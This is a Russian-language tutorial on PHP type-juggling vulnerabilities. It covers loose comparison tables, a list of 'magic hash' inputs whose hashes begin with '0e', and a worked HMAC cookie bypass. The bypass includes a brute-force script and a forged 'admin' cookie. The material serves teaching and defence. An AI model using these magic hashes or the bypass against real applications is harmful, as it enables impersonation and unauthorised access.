**Подмена типа (Type Juggling)**

PHP — это язык с нестрогой типизацией, что означает, что он пытается предугадать намерения программиста и автоматически преобразует переменные в разные типы, когда это кажется необходимым. Например, строка, содержащая только цифры, может рассматриваться как целое число или число с плавающей точкой. Однако такое автоматическое преобразование (или подмена типа) может привести к неожиданным результатам, особенно при сравнении переменных с использованием оператора `==`, который проверяет только равенство значений (нестрогое сравнение), а не равенство типов и значений (строгое сравнение).

**Нестрогое сравнение**

Уязвимости подмены типа в PHP возникают, когда вместо строгого сравнения (`===` или `!==`) используется нестрогое сравнение (`==` или `!=`) в области, где атакующий может контролировать одну из сравниваемых переменных. Эта уязвимость может привести к тому, что приложение вернет непреднамеренный ответ на истинное или ложное утверждение, и может привести к серьезным ошибкам авторизации и/или аутентификации.

*   **Нестрогое сравнение:** использование `==` или `!=` : обе переменные имеют "одинаковое значение".
*   **Строгое сравнение:** использование `===` или `!==` : обе переменные имеют "одинаковый тип и одинаковое значение".

**Истинные утверждения**

| Утверждение | Результат |
| :--- | :--- |
| `'0010e2'   == '1e3'` | `true` |
| `'0xABCdef' == ' 0xABCdef'` | `true` (PHP 5.0) / `false` (PHP 7.0) |
| `'0xABCdef' == '     0xABCdef'` | `true` (PHP 5.0) / `false` (PHP 7.0) |
| `'0x01'     == 1` | `true` (PHP 5.0) / `false` (PHP 7.0) |
| `'0x1234Ab' == '1193131'` | `true` (PHP 5.0) / `false` (PHP 7.0) |
| `'123'  == 123` | `true` |
| `'123a' == 123` | `true` |
| `'abc'  == 0` | `true` |
| `'' == 0 == false == NULL` | `true` |
| `'' == 0` | `true` |
| `0  == false` | `true` |
| `false == NULL` | `true` |
| `NULL == ''` | `true` |

> **Важно:** PHP8 больше не будет пытаться преобразовывать строки в числа, благодаря RFC "Более правильное сравнение строк с числами" (Saner string to number comparisons). Это означает, что коллизии с хешами, начинающимися с `0e`, наконец, уходят в прошлое! RFC "Согласованные ошибки типов для внутренних функций" (Consistent type errors for internal functions) предотвратит такие обходы, как `0 == strcmp($_GET['username'], $password)`, поскольку `strcmp` больше не будет возвращать `null` и выдавать предупреждение, а вместо этого будет выбрасывать соответствующее исключение.

**Нестрогое сравнение типов** встречается во многих языках и системах:
*   MariaDB
*   MySQL
*   NodeJS
*   PHP
*   Perl
*   Postgres
*   Python
*   SQLite

**Магические хеши**

"Магические хеши" возникают из-за особенности подмены типа в PHP при сравнении строковых хешей с целыми числами. Если строковый хеш начинается с `0e`, за которым следуют только цифры, PHP интерпретирует это как экспоненциальную запись (научную нотацию), и хеш при операциях сравнения обрабатывается как число с плавающей точкой.

| Хеш-функция | "Магическое" число / строка | Магический хеш | Найдено |
| :--- | :--- | :--- | :--- |
| MD4 | `gH0nAdHk` | `0e096229559581069251163783434175` | @spaze |
| MD4 | `IiF+hTai` | `00e90130237707355082822449868597` | @spaze |
| MD5 | `240610708` | `0e462097431906509019562988736854` | @spazef0rze |
| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` | @spazef0rze |
| MD5 | `0e1137126905` | `0e291659922323405260514745084877` | @spazef0rze |
| MD5 | `0e215962017` | `0e291242476940776845150308577824` | @spazef0rze |
| MD5 | `129581926211651571912466741651878684928` | `06da5430449f8f6f23dfc1276f722738` | Сырой: `?T0D??o#??'or'8.N=?` |

**Примеры в PHP:**

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

**Методология эксплуатации**

Уязвимость в следующем коде заключается в использовании нестрогого сравнения (`!=`) для проверки `$cookie['hmac']` против вычисленного значения `$hash`.

```php
function validate_cookie($cookie, $key) {
    $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
    if ($cookie['hmac'] != $hash) { // нестрогое сравнение
        return false;
    } else {
        echo "Well done";
    }
}
```

В этом случае, если атакующий может контролировать значение `$cookie['hmac']` и установить его в строку типа `0`, а также каким-то образом заставить функцию `hash_hmac` вернуть хеш, начинающийся с `0e` и содержащий только цифры (что интерпретируется как ноль), условие `$cookie['hmac'] != $hash` будет вычислено как `false`, фактически обходя проверку HMAC.

У нас есть контроль над тремя элементами в cookie:
*   `$username` - имя целевого пользователя, вероятно, "admin"
*   `$expiration` - временная метка UNIX, должна быть в будущем
*   `$hmac` - предоставленный хеш, например, `0`

**Этапы эксплуатации:**

1.  **Подготовка вредоносного cookie:** Атакующий подготавливает cookie с `$username` установленным на пользователя, которого он хочет выдать себя (например, "admin"), `$expiration` установленным на будущую временную метку UNIX, и `$hmac` установленным на `0`.
2.  **Перебор значения `$expiration`:** Затем атакующий перебирает различные значения `$expiration` до тех пор, пока функция `hash_hmac` не сгенерирует хеш, который начинается с `0e` и содержит только цифры. Это вычислительно интенсивный процесс и может быть неосуществим в зависимости от настроек системы. Однако, если это удастся, этот шаг сгенерирует "нулеподобный" хеш.

    ```php
    // docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
    for($i=1424869663; $i < 1835970773; $i++ ){
        $out = hash_hmac('md5', 'admin|'.$i, '');
        if(str_starts_with($out, '0e')){
            if($out == 0){
                echo "$i - ".$out;
                break;
            }
        }
    }
    ?>
    ```
3.  **Обновление данных cookie:** Найденное значение из перебора обновляется в cookie: `1539805986 - 0e772967136366835494939987377058`

    ```php
    $cookie = [
        'username' => 'admin',
        'expiration' => 1539805986,
        'hmac' => '0'
    ];
    ```
    В этом случае мы предположили, что ключ был пустой строкой: `$key = '';`.
